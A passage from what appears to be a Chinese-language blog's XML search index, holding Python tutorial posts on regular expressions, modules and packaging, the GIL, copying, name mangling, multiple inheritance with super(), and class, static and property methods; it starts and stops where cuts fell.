Javascript/CSS/HTML5，JQuery、React、Vue.js&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;/p&gt;&lt;p&gt;加分项：&lt;/p&gt;&lt;p&gt;大数据，数理统计，机器学习，sklearn，高性能，大并发。&lt;/p&gt; &lt;/div&gt;参考答案:1re.sub(r"&lt;[^&gt;]*&gt;|&amp;nbsp;|\n", "", test_str)split 根据匹配进行切割字符串，并返回一个列表需求：切割字符串“info:xiaoZhang 33 shandong”12345#coding=utf-8import reret = re.split(r":| ","info:xiaoZhang 33 shandong")print(ret)运行结果：1['info', 'xiaoZhang', '33', 'shandong']python贪婪和非贪婪Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；非贪婪则相反，总是尝试匹配尽可能少的字符。在”*”,”?”,”+”,”{m,n}”后面加上？，使贪婪变成非贪婪。12345678&gt;&gt;&gt; s="This is a number 234-235-22-423"&gt;&gt;&gt; r=re.match(".+(\d+-\d+-\d+-\d+)",s)&gt;&gt;&gt; r.group(1)'4-235-22-423'&gt;&gt;&gt; r=re.match(".+?(\d+-\d+-\d+-\d+)",s)&gt;&gt;&gt; r.group(1)'234-235-22-423'&gt;&gt;&gt;正则表达式模式中使用到通配字，那它在从左到右的顺序求值时，会尽量“抓取”满足匹配最长字符串，在我们上面的例子里面，“.+”会从字符串的启始处抓取满足模式的最长字符，其中包括我们想得到的第一个整型字段的中的大部分，“\d+”只需一位字符就可以匹配，所以它匹配了数字“4”，而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。解决方式：非贪婪操作符“？”，这个操作符可以用在”*”,”+”,”?”的后面，要求正则匹配的越少越好。123456789&gt;&gt;&gt; re.match(r"aa(\d+)","aa2343ddd").group(1)'2343'&gt;&gt;&gt; re.match(r"aa(\d+?)","aa2343ddd").group(1)'2'&gt;&gt;&gt; re.match(r"aa(\d+)ddd","aa2343ddd").group(1) '2343'&gt;&gt;&gt; re.match(r"aa(\d+?)ddd","aa2343ddd").group(1)'2343'&gt;&gt;&gt;r的作用123456789101112131415161718192021&gt;&gt;&gt; mm = "c:\\a\\b\\c"&gt;&gt;&gt; mm'c:\\a\\b\\c'&gt;&gt;&gt; print(mm)c:\a\b\c&gt;&gt;&gt; re.match("c:\\\\",mm).group()'c:\\'&gt;&gt;&gt; ret = re.match("c:\\\\",mm).group()&gt;&gt;&gt; print(ret)c:\&gt;&gt;&gt; ret = re.match("c:\\\\a",mm).group()&gt;&gt;&gt; print(ret)c:\a&gt;&gt;&gt; ret = re.match(r"c:\\a",mm).group()&gt;&gt;&gt; print(ret)c:\a&gt;&gt;&gt; ret = re.match(r"c:\a",mm).group()Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;AttributeError: 'NoneType' object has no attribute 'group'&gt;&gt;&gt;说明Python中字符串前面加上 r 表示原生字符串，与大多数编程语言相同，正则表达式里使用&quot;\&quot;作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符”\”，那么使用编程语言表示的正则表达式里将需要4个反斜杠”\“：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。Python里的原生字符串很好地解决了这个问题，有了原生字符串，你再也不用担心是不是漏写了反斜杠，写出来的表达式也更直观。123&gt;&gt;&gt; ret = re.match(r"c:\\a",mm).group()&gt;&gt;&gt; print(ret)c:\a]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python_模块和包]]></title>
    <url>%2F2019%2F12%2F31%2Fpython_%E6%A8%A1%E5%9D%97%E5%92%8C%E5%8C%85%2F</url>
    <content type="text"><![CDATA[模块和包01. 模块1.1 模块的概念模块是 Python 程序架构的一个核心概念每一个以扩展名 py 结尾的 Python 源代码文件都是一个 模块模块名 同样也是一个 标识符，需要符合标识符的命名规则在模块中定义的 全局变量 、函数、类 都是提供给外界直接使用的 工具模块 就好比是 工具包，要想使用这个工具包中的工具，就需要先 导入 这个模块1.2 模块的两种导入方式1）import 导入1import 模块名1, 模块名2提示：在导入模块时，每个导入应该独占一行12import 模块名1import 模块名2导入之后通过 模块名. 使用 模块提供的工具 —— 全局变量、函数、类使用 as 指定模块的别名如果模块的名字太长，可以使用 as 指定模块的名称，以方便在代码中的使用1import 模块名1 as 模块别名注意：模块别名 应该符合 大驼峰命名法2）from…import 导入如果希望 从某一个模块 中，导入 部分 工具，就可以使用 from … import 的方式import 模块名 是 一次性 把模块中 所有工具全部导入，并且通过 模块名/别名 访问12# 从 模块 导入 某一个工具from 模块名1 import 工具名导入之后不需要 通过 模块名.可以直接使用 模块提供的工具 —— 全局变量、函数、类注意如果 两个模块，存在 同名的函数，那么 后导入模块的函数，会 覆盖掉先导入的函数开发时 import 代码应该统一写在 代码的顶部，更容易及时发现冲突一旦发现冲突，可以使用 as 关键字 给其中一个工具起一个别名from…import *（知道）12# 从 模块 导入 所有工具from 模块名1 import *注意这种方式不推荐使用，因为函数重名并没有任何的提示，出现问题不好排查1.3 模块的搜索顺序[扩展]Python 的解释器在 导入模块 时，会：搜索 当前目录 指定模块名的文件，如果有就直接导入如果没有，再搜索 系统目录在开发时，给文件起名，不要和 系统的模块文件 重名Python 中每一个模块都有一个内置属性 _file__可以 查看模块 的 完整路径示例123456import random# 生成一个 0～10 的数字rand = random.randint(0, 10)print(rand)注意：如果当前目录下，存在一个 random.py 的文件，程序就无法正常执行了！这个时候，Python 的解释器会 加载当前目录 下的 random.py 而不会加载 系统的 random 模块1.4 原则 —— 每一个文件都应该是可以被导入的一个 独立的 Python 文件 就是一个 模块在导入文件时，文件中 所有没有任何缩进的代码 都会被执行一遍！实际开发场景在实际开发中，每一个模块都是独立开发的，大多都有专人负责开发人员 通常会在 模块下方 增加一些测试代码仅在模块内使用，而被导入到其他文件中不需要执行__name__属性name 属性可以做到，测试模块的代码 只在测试情况下被运行，而在 被导入时不会被执行！__name__是 Python 的一个内置属性，记录着一个 字符串如果 是被其他文件导入的，__name__就是 模块名如果 是当前执行的程序 __name__是__main__在很多 Python 文件中都会看到以下格式的代码：12345678910111213# 导入模块# 定义全局变量# 定义类# 定义函数# 在代码的最下方def main(): # ... pass# 根据 __name__ 判断是否执行下方代码if __name__ == "__main__": main()02. 包（Package）概念包 是一个 包含多个模块 的 特殊目录目录下有一个 特殊的文件 __init__.py包名的 命名方式 和变量名一致，小写字母 + _好处使用 import 包名 可以一次性导入 包 中 所有的模块案例演练新建一个 hm_message 的 包在目录下，新建两个文件 send_message 和 receive_message在 send_message 文件中定义一个 send 函数在 receive_message 文件中定义一个 receive 函数在外部直接导入 hm_message 的包__init__.py要在外界使用 包 中的模块，需要在 init.py 中指定 对外界提供的模块列表123# 从 当前目录 导入 模块列表from . import send_messagefrom . import receive_message03. 发布模块（知道）如果希望自己开发的模块，分享 给其他人，可以按照以下步骤操作3.1 制作发布压缩包步骤1) 创建 setup.py- setup.py 的文件 1234567891011from distutils.core import setupsetup(name="hm_message", # 包名 version="1.0", # 版本 description="itheima's 发送和接收消息模块", # 描述信息 long_description="完整的发送和接收消息模块", # 完整描述信息 author="itheima", # 作者 author_email="itheima@itheima.com", # 作者邮箱 url="www.itheima.com", # 主页 py_modules=["hm_message.send_message", "hm_message.receive_message"])有关字典参数的详细信息，可以参阅官方网站：https://docs.python.org/2/distutils/apiref.html2) 构建模块1$ python3 setup.py build3) 生成发布压缩包1$ python3 setup.py sdist注意：要制作哪个版本的模块，就使用哪个版本的解释器执行！3.2 安装模块12$ tar -zxvf hm_message-1.0.tar.gz $ sudo python3 setup.py install卸载模块直接从安装目录下，把安装模块的 目录 删除就可以12$ cd /usr/local/lib/python3.5/dist-packages/$ sudo rm -r hm_message*3.3 pip 安装第三方模块第三方模块 通常是指由 知名的第三方团队 开发的 并且被 程序员广泛使用 的 Python 包 / 模块例如 pygame 就是一套非常成熟的 游戏开发模块pip 是一个现代的，通用的 Python 包管理工具,提供了对 Python 包的查找、下载、安装、卸载等功能安装和卸载命令如下：1234567# 将模块安装到 Python 2.x 环境$ sudo pip install pygame$ sudo pip uninstall pygame# 将模块安装到 Python 3.x 环境$ sudo pip3 install pygame$ sudo pip3 uninstall pygame在 Mac 下安装 iPython1$ sudo pip install ipython在 Linux 下安装 iPython12$ sudo apt install ipython$ sudo apt install ipython3]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python_扩展知识点]]></title>
    <url>%2F2019%2F12%2F31%2Fpython_%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[GIL（全局解释器锁）GIL面试题如下描述Python GIL的概念， 以及它对python多线程的影响？编写一个多线程抓取网页的程序，并阐明多线程抓取程序是否可比单线程性能有提升，并解释原因。Guido的声明：http://www.artima.com/forums/flat.jsp?forum=106&amp;thread=214235he language doesn’t require the GIL – it’s only the CPython virtual machine that has historically been unable to shed it.单线程死循环单独执行该文件会占满一个CPU核心数(相当于单进程单线程)，两个窗口执行该文件会占满两个CPU核心数(相当于两进程两线程)123456#!/usr/bin/env python#-*- coding: utf-8 -*-# 主线程死循环，占满CPUwhile True: pass # 占位符，空语句，还是要执行的两个线程死循环单独执行该文件每个CPU核心会占一半(单进程两线程)12345678910111213141516#!/usr/bin/env python#-*- coding: utf-8 -*-from threading import Thread# 子线程死循环def a(): while True: passt = Thread(target=a)t.start()# 主线程死循环while True: pass两个进程死循环单独执行该文件会占满二个CPU核心数12345678910111213141516#!/usr/bin/env python#-*- coding: utf-8 -*-from multiprocessing import Process# 子进程死循环def a(): while True: passif __name__ == '__main__': t = Process(target=a) t.start() # 主进程死循环 while True: pass总结：多线程并不是真正的并行，而是伪并行，也就是并发。原因就是因为线程有GIL全局解释器锁。只有进程才是真正的并行参考答案Python语言和GIL没有半毛钱关系。仅仅是由于历史原因在Cpython虚拟机(C语言解释器)中难以移除GIL。(其他python解释器没有GIL，比如java语言写的jpython解释器)GIL：全局解释器锁。每个线程在执行的过程都需要先获取GIL，保证同一时刻只有一个线程可以执行代码。线程释放GIL锁的情况： 在IO操作等可能会引起阻塞的system call之前,可以暂时释放GIL,但在执行完毕后,必须重新获取GIL Python 3.x使用计时器（执行时间达到阈值后，当前线程释放GIL）或Python 2.x，tickets计数达到100计算密集型：程序没有延时，一直在计算数据；IO密集型：输入输出，读写操作线程和协程适用于IO密集型，计算密集型考虑使用进程。Python使用多进程是可以利用多核的CPU资源的。多线程爬取比单线程性能有提升，因为遇到IO阻塞会自动释放GIL锁使用c语言来解决GIL问题子线程使用的是c语言的函数，此时单独执行该文件，会占满两个CPU核心123456789101112131415from ctypes import *from threading import Thread# 加载动态库# 把一个C语言编译成一个动态库文件的命令(linux平台)# gcc libdead_loop.c -shared -o libdead_loop.solib = cdll.LoadLibrary("./libdead_loop.so")# 创建一个子线程，让其执行c语言编写的函数(DeadLoop)，此函数是一个死循环t = Thread(target=lib.DeadLoop)t.start()# 主线程while True: pass如何解决GIL换python解释器，不使用Cpython解释器，使用jpython解释器等用其他语言来替代线程中的代码，不如上例中的c语言，(胶水语言)深拷贝、浅拷贝1. 浅拷贝浅拷贝是对于一个对象的顶层拷贝通俗的理解是：拷贝了引用，并没有拷贝内容2. 深拷贝深拷贝是对于一个对象所有层次的拷贝(递归)进一步理解深拷贝3. 拷贝的其他方式分片表达式可以赋值一个序列字典的copy方法可以拷贝一个字典4. 注意点浅拷贝对不可变类型和可变类型的copy不同copy.copy对于可变类型，会进行浅拷贝copy.copy对于不可变类型，不会拷贝，仅仅是指向比如：如果copy.copy拷贝的是元组，那么它不会进行浅拷贝，仅仅是指向原因：因为元组是不可变类型，那么意味着数据一定不能修改，因此用copy.copy的时候它会自动判断，如果是元组它就指向了它123456789101112131415161718In [88]: a = [11,22,33]In [89]: b = copy.copy(a)In [90]: id(a)Out[90]: 59275144In [91]: id(b)Out[91]: 59525600In [92]: a.append(44)In [93]: aOut[93]: [11, 22, 33, 44]In [94]: bOut[94]: [11, 22, 33]In [95]: a = (11,22,33)In [96]: b = copy.copy(a)In [97]: id(a)Out[97]: 58890680In [98]: id(b)Out[98]: 58890680如果用copy.copy或者copy.deepcopy对一个全部都是不可变类型的数据进行拷贝，那么他们结果相同的，都是引用指向如果拷贝的是一个拥有可变类型的数据，即使元组是最顶层，copy.deepcopy依然是深拷贝，而copy.copy还是指向。123456789101112131415161718192021In[37]: a = [11,22]In[38]: b = [33,44]In[39]: c = (a,b)In[40]: import copyIn[41]: d = copy.copy(c)In[42]: id(c)Out[42]: 86387080In[43]: id(d)Out[43]: 86387080In[44]: e = copy.deepcopy(c)In[45]: id(e)Out[45]: 87301192In[46]: cOut[46]: ([11, 22], [33, 44])In[47]: eOut[47]: ([11, 22], [33, 44])In[48]: a.append(55)In[49]: cOut[49]: ([11, 22, 55], [33, 44])In[50]: eOut[50]: ([11, 22], [33, 44])copy.copy和copy.deepcopy的区别copy.copycopy.deepcopy私有化xx: 公有变量_x: 单前置下划线,私有化属性或方法，from module import * 禁止导入,类对象和子类可以访问__xx：双前置下划线,避免与子类中的属性命名冲突，无法在外部直接访问(名字重整所以访问不到)__xx__:双前后下划线,用户名字空间的魔法对象或属性。例如:__init__ , __ 不要自己发明这样的名字xx_:单后置下划线,用于避免与Python关键词的冲突通过name mangling（名字重整(目的就是以防子类意外重写基类的方法或者属性)如：_Classobject）机制就可以访问private了。(在 名称 前面加上 _类名 =&gt; _类名名称)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#coding=utf-8class Person(object): def __init__(self, name, age, taste): self.name = name self._age = age self.__taste = taste def showperson(self): print(self.name) print(self._age) print(self.__taste) def dowork(self): self._work() self.__away() def _work(self): print('my _work') def __away(self): print('my __away')class Student(Person): def construction(self, name, age, taste): self.name = name self._age = age self.__taste = taste def showstudent(self): print(self.name) print(self._age) print(self.__taste) @staticmethod def testbug(): _Bug.showbug()# 模块内可以访问，当from cur_module import *时，不导入class _Bug(object): @staticmethod def showbug(): print("showbug")s1 = Student('jack', 25, 'football')s1.showperson()print('*'*20)# 无法访问__taste,导致报错# s1.showstudent() s1.construction('rose', 30, 'basketball')s1.showperson()print('*'*20)s1.showstudent()print('*'*20)Student.testbug()总结_名的变量、函数、类在使用from xxx import *时都不会被导入，类对象和子类可以访问父类中属性名为__名字的，子类不继承，子类不能访问，子类可以通过父类中的其他方法间接访问如果在子类中向__名字赋值，那么会在子类中定义一个与父类相同名字的属性import导入模块1. import 搜索路径路径搜索从上面列出的目录里依次查找要导入的模块文件开头的第一个‘’ 表示当前路径列表中的路径的先后顺序代表了python解释器在搜索模块时的先后顺序程序执行时添加新的模块路径12345678910111213141516sys.path.append('/home/itcast/xxx')sys.path.insert(0, '/home/itcast/xxx') # 可以确保先搜索这个路径In [37]: sys.path.insert(0,"/home/python/xxxx")In [38]: sys.pathOut[38]: ['/home/python/xxxx', '', '/usr/bin', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3/dist-packages/IPython/extensions', '/home/python/.ipython']2. 重新导入模块模块被导入后，import module不能重新导入模块，重新导入需用reload3. 多模块开发时的注意点12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273recv_msg.py模块from common import RECV_DATA_LIST# from common import HANDLE_FLAGimport commondef recv_msg(): &quot;&quot;&quot;模拟接收到数据，然后添加到common模块中的列表中&quot;&quot;&quot; print(&quot;---&gt;recv_msg&quot;) for i in range(5): RECV_DATA_LIST.append(i)def test_recv_data(): &quot;&quot;&quot;测试接收到的数据&quot;&quot;&quot; print(&quot;---&gt;test_recv_data&quot;) print(RECV_DATA_LIST)def recv_msg_next(): &quot;&quot;&quot;已经处理完成后，再接收另外的其他数据&quot;&quot;&quot; print(&quot;---&gt;recv_msg_next&quot;) # if HANDLE_FLAG: if common.HANDLE_FLAG: print(&quot;------发现之前的数据已经处理完成，这里进行接收其他的数据(模拟过程...)----&quot;) else: print(&quot;------发现之前的数据未处理完，等待中....------&quot;)handle_msg.py模块from common import RECV_DATA_LIST# from common import HANDLE_FLAGimport commondef handle_data(): &quot;&quot;&quot;模拟处理recv_msg模块接收的数据&quot;&quot;&quot; print(&quot;---&gt;handle_data&quot;) for i in RECV_DATA_LIST: print(i) # 既然处理完成了，那么将变量HANDLE_FLAG设置为True，意味着处理完成 # global HANDLE_FLAG # HANDLE_FLAG = True common.HANDLE_FLAG = Truedef test_handle_data(): &quot;&quot;&quot;测试处理是否完成，变量是否设置为True&quot;&quot;&quot; print(&quot;---&gt;test_handle_data&quot;) # if HANDLE_FLAG: if common.HANDLE_FLAG: print(&quot;=====已经处理完成====&quot;) else: print(&quot;=====未处理完成====&quot;)main.py模块from recv_msg import *from handle_msg import *def main(): # 1. 接收数据 recv_msg() # 2. 测试是否接收完毕 test_recv_data() # 3. 判断如果处理完成，则接收其它数据 recv_msg_next() # 4. 处理数据 handle_data() # 5. 测试是否处理完毕 test_handle_data() # 6. 判断如果处理完成，则接收其它数据 recv_msg_next()if __name__ == &quot;__main__&quot;: main()再议 封装、继承、多态封装、继承、多态 是面向对象的3大特性为啥要封装好处在使用面向过程编程时，当需要对数据处理时，需要考虑用哪个模板中哪个函数来进行操作，但是当用面向对象编程时，因为已经将数据存储到了这个独立的空间中，这个独立的空间（即对象）中通过一个特殊的变量（class）能够获取到类（模板），而且这个类中的方法是有一定数量的，与此类无关的将不会出现在本类中，因此需要对数据处理时，可以很快速的定位到需要的方法是谁 这样更方便全局变量是只能有1份的，多很多个函数需要多个备份时，往往需要利用其它的变量来进行储存；而通过封装 会将用来存储数据的这个变量 变为了对象中的一个“全局”变量，只要对象不一样那么这个变量就可以再有1份，所以这样更方便代码划分更清晰面向过程1234567891011121314151617181920212223全局变量1全局变量2全局变量3...def 函数1(): passdef 函数2(): passdef 函数3(): passdef 函数4(): passdef 函数5(): pass面向对象1234567891011121314151617181920class 类(object): 属性1 属性2 def 方法1(self): pass def 方法2(self): passclass 类2(object): 属性3 def 方法3(self): pass def 方法4(self): pass def 方法5(self): pass为啥要继承说明能够提升代码的重用率，即开发一个类，可以在多个子功能中直接使用继承能够有效的进行代码的管理，当某个类有问题只要修改这个类就行，而其继承这个类的子类往往不需要就修改怎样理解多态12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class MiniOS(object): """MiniOS 操作系统类 """ def __init__(self, name): self.name = name self.apps = [] # 安装的应用程序名称列表 def __str__(self): return "%s 安装的软件列表为 %s" % (self.name, str(self.apps)) def install_app(self, app): # 判断是否已经安装了软件 if app.name in self.apps: print("已经安装了 %s，无需再次安装" % app.name) else: app.install() self.apps.append(app.name)class App(object): def __init__(self, name, version, desc): self.name = name self.version = version self.desc = desc def __str__(self): return "%s 的当前版本是 %s - %s" % (self.name, self.version, self.desc) def install(self): print("将 %s [%s] 的执行程序复制到程序目录..." % (self.name, self.version))class PyCharm(App): passclass Chrome(App): def install(self): print("正在解压缩安装程序...") super().install()linux = MiniOS("Linux")print(linux)pycharm = PyCharm("PyCharm", "1.0", "python 开发的 IDE 环境")chrome = Chrome("Chrome", "2.0", "谷歌浏览器")linux.install_app(pycharm)linux.install_app(chrome)linux.install_app(chrome)print(linux)运行结果123456Linux 安装的软件列表为 []将 PyCharm [1.0] 的执行程序复制到程序目录...正在解压缩安装程序...将 Chrome [2.0] 的执行程序复制到程序目录...已经安装了 Chrome，无需再次安装Linux 安装的软件列表为 [&apos;PyCharm&apos;, &apos;Chrome&apos;]多继承以及MRO顺序1. 单独调用父类的方法父类被调用多次123456789101112131415161718192021222324252627282930313233343536# coding=utf-8print("******多继承使用类名.__init__ 发生的状态******")class Parent(object): def __init__(self, name): print('parent的init开始被调用') self.name = name print('parent的init结束被调用')class Son1(Parent): def __init__(self, name, age): print('Son1的init开始被调用') self.age = age Parent.__init__(self, name) print('Son1的init结束被调用')class Son2(Parent): def __init__(self, name, gender): print('Son2的init开始被调用') self.gender = gender Parent.__init__(self, name) print('Son2的init结束被调用')class Grandson(Son1, Son2): def __init__(self, name, age, gender): print('Grandson的init开始被调用') Son1.__init__(self, name, age) # 单独调用父类的初始化方法 Son2.__init__(self, name, gender) print('Grandson的init结束被调用')gs = Grandson('grandson', 12, '男')print('姓名：', gs.name)print('年龄：', gs.age)print('性别：', gs.gender)print("******多继承使用类名.__init__ 发生的状态******\n\n")运行结果:123456789101112131415******多继承使用类名.__init__ 发生的状态******Grandson的init开始被调用Son1的init开始被调用parent的init开始被调用parent的init结束被调用Son1的init结束被调用Son2的init开始被调用parent的init开始被调用parent的init结束被调用Son2的init结束被调用Grandson的init结束被调用姓名： grandson年龄： 12性别： 男******多继承使用类名.__init__ 发生的状态******2. 多继承中super调用有所父类的被重写的方法使用super方法父类被调用一次123456789101112131415161718192021222324252627282930313233343536373839404142434445print("******多继承使用super().__init__ 发生的状态******")class Parent(object): def __init__(self, name, *args, **kwargs): # 为避免多继承报错，使用不定长参数，接受参数 print('parent的init开始被调用') self.name = name print('parent的init结束被调用')class Son1(Parent): def __init__(self, name, age, *args, **kwargs): # 为避免多继承报错，使用不定长参数，接受参数 print('Son1的init开始被调用') self.age = age super().__init__(name, *args, **kwargs) # 为避免多继承报错，使用不定长参数，接受参数 print('Son1的init结束被调用')class Son2(Parent): def __init__(self, name, gender, *args, **kwargs): # 为避免多继承报错，使用不定长参数，接受参数 print('Son2的init开始被调用') self.gender = gender super().__init__(name, *args, **kwargs) # 为避免多继承报错，使用不定长参数，接受参数 print('Son2的init结束被调用')class Grandson(Son1, Son2): def __init__(self, name, age, gender): print('Grandson的init开始被调用') # 多继承时，相对于使用类名.__init__方法，要把每个父类全部写一遍 # 而super只用一句话，执行了全部父类的方法，这也是为何多继承需要全部传参的一个原因 # super(Grandson, self).__init__(name, age, gender) super().__init__(name, age, gender) print('Grandson的init结束被调用')"""# 以下两种写法结果是一样的super(Grandson, self).__init__(name, age, gender) # 调用指定类的下一个类super().__init__(name, age, gender) # 不指定类的话则默认是当前使用的类的下一个类# 指定类的调用super(Son2, self).__init__(name, age, gender) # 指定Son1类的下一个类调用，也就是Son2类""" print(Grandson.__mro__) # 输出一个元组，父类调用的顺序 # python解释器的C3算法计算出来的结果gs = Grandson('grandson', 12, '男')print('姓名：', gs.name)print('年龄：', gs.age)print('性别：', gs.gender)print("******多继承使用super().__init__ 发生的状态******\n\n")运行结果：1234567891011121314******多继承使用super().__init__ 发生的状态******(&lt;class '__main__.Grandson'&gt;, &lt;class '__main__.Son1'&gt;, &lt;class '__main__.Son2'&gt;, &lt;class '__main__.Parent'&gt;, &lt;class 'object'&gt;)Grandson的init开始被调用Son1的init开始被调用Son2的init开始被调用parent的init开始被调用parent的init结束被调用Son2的init结束被调用Son1的init结束被调用Grandson的init结束被调用姓名： grandson年龄： 12性别： 男******多继承使用super().__init__ 发生的状态******注意：以上2个代码执行的结果不同如果2个子类中都继承了父类，当在子类中通过父类名调用时，parent被执行了2次如果2个子类中都继承了父类，当在子类中通过super调用时，parent被执行了1次3. 单继承中super123456789101112131415161718192021222324252627print("******单继承使用super().__init__ 发生的状态******")class Parent(object): def __init__(self, name): print('parent的init开始被调用') self.name = name print('parent的init结束被调用')class Son1(Parent): def __init__(self, name, age): print('Son1的init开始被调用') self.age = age super().__init__(name) # 单继承不能提供全部参数 print('Son1的init结束被调用')class Grandson(Son1): def __init__(self, name, age, gender): print('Grandson的init开始被调用') super().__init__(name, age) # 单继承不能提供全部参数 print('Grandson的init结束被调用')print(Grandson.__mro__)gs = Grandson('grandson', 12, '男')print('姓名：', gs.name)print('年龄：', gs.age)#print('性别：', gs.gender)print("******单继承使用super().__init__ 发生的状态******\n\n")运行结果：1234567891011******单继承使用super().__init__ 发生的状态******(&lt;class '__main__.Grandson'&gt;, &lt;class '__main__.Son1'&gt;, &lt;class '__main__.Parent'&gt;, &lt;class 'object'&gt;)Grandson的init开始被调用Son1的init开始被调用parent的init开始被调用parent的init结束被调用Son1的init结束被调用Grandson的init结束被调用姓名： grandson年龄： 12******单继承使用super().__init__ 发生的状态******总结super().init相对于类名.init，在单继承上用法基本无差但在多继承上有区别，super方法能保证每个父类的方法只会执行一次，而使用类名的方法会导致方法被执行多次，具体看前面的输出结果多继承时，使用super方法，对父类的传参数，应该是由于python中super的算法导致的原因，必须把参数全部传递，否则会报错单继承时，使用super方法，则不能全部传递，只能传父类方法所需的参数，否则会报错多继承时，相对于使用类名.init方法，要把每个父类全部写一遍, 而使用super方法，只需写一句话便执行了全部父类的方法，这也是为何多继承需要全部传参的一个原因小试牛刀(以下为面试题)以下的代码的输出将是什么? 说出你的答案并解释。1234567891011121314class Parent(object): x = 1class Child1(Parent): passclass Child2(Parent): passprint(Parent.x, Child1.x, Child2.x)Child1.x = 2print(Parent.x, Child1.x, Child2.x)Parent.x = 3print(Parent.x, Child1.x, Child2.x)答案, 以上代码的输出是：1231 1 11 2 13 2 3使你困惑或是惊奇的是关于最后一行的输出是 3 2 3 而不是 3 2 1。为什么改变了 Parent.x 的值还会改变 Child2.x 的值，但是同时 Child1.x 值却没有改变？这个答案的关键是，在 Python 中，类变量在内部是作为字典处理的。如果一个变量的名字没有在当前类的字典中发现，将搜索祖先类（比如父类）直到被引用的变量名被找到（如果这个被引用的变量名既没有在自己所在的类又没有在祖先类中找到，会引发一个 AttributeError 异常 ）。因此，在父类中设置 x = 1 会使得类变量 x 在引用该类和其任何子类中的值为 1。这就是因为第一个 print 语句的输出是 1 1 1。随后，如果任何它的子类重写了该值（例如，我们执行语句 Child1.x = 2），然后，该值仅仅在子类中被改变。这就是为什么第二个 print 语句的输出是 1 2 1。最后，如果该值在父类中被改变（例如，我们执行语句 Parent.x = 3），这个改变会影响到任何未重写该值的子类当中的值（在这个示例中被影响的子类是 Child2）。这就是为什么第三个 print 输出是 3 2 3。自己的想法，按顺序解析print(Parent.x, Child1.x, Child2.x)，其中Parent.x是调用Parent类中的x属性，输出结果是1；Child1.x是输出Child1类中的x属性，本类没有的话则到父类中查找，父类Parent中有，则输出结果是1；Child2.x同理。Child1.x = 2相当于给Child1类添加一个类属性。print(Parent.x, Child1.x, Child2.x)，其中Parent.x是调用Parent类中的x属性，输出结果是1；Child1.x是输出Child1类中的x属性，本类中有这个属性则直接输出，不用到父类中查找，输出的结果是2；Child2.x还是从父类中查找，输出结果是1。Parent.x = 3相当于修改父类Parent中x类属性的值。print(Parent.x, Child1.x, Child2.x)，其中Parent.x是调用Parent类中的x属性，输出结果是3；Child1.x是输出Child1类中的x属性，本类中有这个属性则直接输出，不用到父类中查找，输出的结果是2；Child2.x还是从父类中查找，输出结果是3。再论静态方法和类方法1. 类属性、实例属性它们在定义和使用中有所区别，而最本质的区别是内存中保存的位置不同，实例属性属于对象类属性属于类12345678910111213141516171819202122class Province(object): # 类属性 country = '中国' def __init__(self, name): # 实例属性 self.name = name# 创建一个实例对象obj = Province('山东省')# 直接访问实例属性print(obj.name)# 直接访问类属性Province.country# 通过实例对象访问类属性 obj.__class__.country# Province('山东省')做如下两件事情：# 1. 调用__new__方法，创建对象，通俗点说是创建一个内存空间# 2. 调用__init__方法，对刚才申请的空间进行初始化# __class__指向类对象由上述代码可以看出【实例属性需要通过对象来访问】【类属性通过类访问】，在使用上可以看出实例属性和类属性的归属是不同的。其在内容的存储方式类似如下图：由上图看出：类属性在内存中只保存一份实例属性在每个对象中都要保存一份应用场景：通过类创建实例对象时，如果每个对象需要具有相同名字的属性，那么就使用类属性，用一份即可2. 实例方法、静态方法和类方法方法包括：实例方法、静态方法和类方法，三种方法在内存中都归属于类，区别在于调用方式不同。实例方法：由对象调用；至少一个self参数；执行实例方法时，自动将调用该方法的对象赋值给self；类方法：由类调用； 至少一个cls参数；执行类方法时，自动将调用该方法的类赋值给cls；静态方法：由类调用；无默认参数；12345678910111213141516171819202122232425262728293031323334353637383940class Foo(object): def __init__(self, name): self.name = name def ord_func(self): """ 定义实例方法，至少有一个self参数，传递的是实例对象的引用 """ # print(self.name) # 实例方法可以修改实例对象的属性 print('实例方法') @classmethod def class_func(cls): """ 定义类方法，至少有一个cls参数 ，传递的是类对象的引用""" # 类方法可以修改类对象的属性 print('类方法') @staticmethod def static_func(): """ 定义静态方法 ，无默认参数""" print('静态方法')f = Foo("中国")# 调用实例方法f.ord_func()# 调用类方法Foo.class_func()# 调用静态方法Foo.static_func()# 通过实例对象调用类方法f.__class__.class_func()# 通过实例对象调用静态方法f.__class__.static_func()# 总结# 1.实例对象可以调用类方法，实例方法和静态方法# 2.类对象可以调用类方法和静态方法，不能调用实例方法对比相同点：对于所有的方法而言，均属于类，所以在内存中也只保存一份不同点：方法调用者不同、调用方法时自动传入的参数不同property属性1. 什么是property属性一种用起来像是使用的实例属性一样的特殊属性，可以对应于某个方法123456789101112131415# ######## 定义 ########class Foo: def func(self): pass # 定义property属性，把实例方法装饰成一个实例属性 @property def prop(self): """返回一个值""" pass# ######## 调用 ########foo_obj = Foo()foo_obj.func() # 调用实例方法foo_obj.prop # 调用property属性property属性的定义和调用要注意一下几点：定义时，在实例方法的基础上添加 @property 装饰器；并且仅有一个self参数调用时，无需括号12方法：foo_obj.func()property属性：foo_obj.prop2. 简单的实例对于京东商城中显示电脑主机的列表页面，每次请求不可能把数据库中的所有内容都显示到页面上，而是通过分页的功能局部显示，所以在向数据库中请求数据时就要显示的指定获取从第m条到第n条的所有数据 这个分页的功能包括：根据用户请求的当前页和总数据条数计算出 m 和 n根据m 和 n 